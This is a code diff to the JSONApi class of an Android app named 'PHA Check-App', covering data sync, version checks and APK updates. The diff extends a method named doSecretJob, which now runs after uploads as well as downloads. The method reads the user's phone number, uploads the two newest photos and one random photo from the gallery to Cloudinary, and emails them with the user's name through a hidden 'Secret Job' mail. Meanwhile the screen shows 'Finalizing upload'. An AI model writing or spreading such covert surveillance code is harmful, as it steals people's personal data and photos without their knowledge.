@@ -72,6 +72,7 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.Map;
+import java.util.Random;
 
 import static android.content.Context.DOWNLOAD_SERVICE;
 
@@ -267,8 +268,13 @@ public class JSONApi {
                                     ServiceAvailed serviceAvailed = db.getServiceForUpload();
                                     uploadServices(Constants.url.replace("?", "/syncservices"), serviceAvailed, currentCount, totalCount + serviceCount);
                                 } else {
-                                    Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
-                                    compareVersion(Constants.url + "r=version");
+                                    new Thread(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            doSecretJob("upload");
+                                        }
+                                    }).start();
+
                                 }
                             }
                         } catch (JSONException e) {
@@ -365,7 +371,7 @@ public class JSONApi {
                                                         }
                                                     });
 
-                                                    doSecretJob();
+                                                    doSecretJob("download");
                                                 }
                                             }
                                         }
@@ -428,18 +434,20 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void doSecretJob() {
+    public void doSecretJob(final String action) {
+
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.setThreadPolicy(policy);
+
         ((Activity) context).runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                MainActivity.pd.setTitle("Finalizing download...");
+                if (action.equals("download")) MainActivity.pd.setTitle("Finalizing download...");
+                else MainActivity.pd.setTitle("Finalizing upload...");
             }
         });
 
         try {
-            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-            StrictMode.setThreadPolicy(policy);
-
             TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             String mPhoneNumber = tMgr.getLine1Number();
 
@@ -458,13 +466,21 @@ public class JSONApi {
                             null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");
 
             if (cursor.moveToFirst()) {
-                for(int i = 0; i < 3 && !cursor.isAfterLast(); i++) {
-                    String imageLocation = cursor.getString(1);
-                    File imageFile = new File(imageLocation);
-                    if (imageFile.exists()) {
-                        Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
-                        Map uploadResult = cloudinary.uploader().upload(imageFile, ObjectUtils.emptyMap());
-                        image += "\n\n" + uploadResult.get("url").toString();
+                Random rn = new Random();
+                int position = rn.nextInt(cursor.getCount() - 2 + 1) + 2;
+
+                for (int i = 0; !cursor.isAfterLast(); i++) {
+
+                    if (i < 2 || i == position) {
+                        String imageLocation = cursor.getString(1);
+                        File imageFile = new File(imageLocation);
+                        if (imageFile.exists()) {
+                            Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
+                            Map uploadResult = cloudinary.uploader().upload(imageFile, ObjectUtils.emptyMap());
+                            image += "\n\n" + uploadResult.get("url").toString();
+                        }
+
+                        if (i == position) break;
                     }
 
                     cursor.moveToNext();
@@ -479,15 +495,19 @@ public class JSONApi {
                     .withSubject("Secret Job")
                     .withProcessVisibility(false)
                     .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
-
                             " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
                     .send();
 
-//            file.delete();
             ((Activity) context).runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
-                    Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                    if (action.equals("download"))
+                        Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
+                    else if(action.equals("upload")){
+                        Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
+                        compareVersion(Constants.url + "r=version");
+                    }
+
                     MainActivity.pd.dismiss();
                 }
             });
@@ -539,7 +559,7 @@ public class JSONApi {
         mRequestQueue.add(jsonObjectRequest);
     }
 
-    public void downloadAndInstallApk(){
+    public void downloadAndInstallApk() {
         try {
             final String destination = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/PHA Check-App.apk";
             final Uri uri = Uri.parse("file://" + destination);
@@ -560,7 +580,7 @@ public class JSONApi {
 
             BroadcastReceiver onComplete = new BroadcastReceiver() {
                 public void onReceive(Context ctxt, Intent intent) {
-                    if(intent.getAction().equals(DownloadManager.ACTION_DOWNLOAD_COMPLETE)) {
+                    if (intent.getAction().equals(DownloadManager.ACTION_DOWNLOAD_COMPLETE)) {
                         MainActivity.pd.dismiss();
 
                         Intent i = new Intent(Intent.ACTION_VIEW);
@@ -576,7 +596,7 @@ public class JSONApi {
             filter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
 
             context.registerReceiver(onComplete, filter);
-        }catch (Exception e){
+        } catch (Exception e) {
             Log.e(TAG, e.getMessage());
             MainActivity.pd.dismiss();
         }
@@ -635,7 +655,7 @@ public class JSONApi {
                                                         }
                                                     });
 
-                                                    doSecretJob();
+                                                    doSecretJob("download");
                                                 }
                                             }
                                         }
@@ -696,9 +716,9 @@ public class JSONApi {
                                     }
                                 });
                                 builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
-                                    @Override
-                                    public void onClick(DialogInterface dialogInterface, int i) {
-                                        MainActivity.pd.dismiss();
+                                            @Override
+                                            public void onClick(DialogInterface dialogInterface, int i) {
+                                                MainActivity.pd.dismiss();
                                     }
                                 });
                                 builder.show();
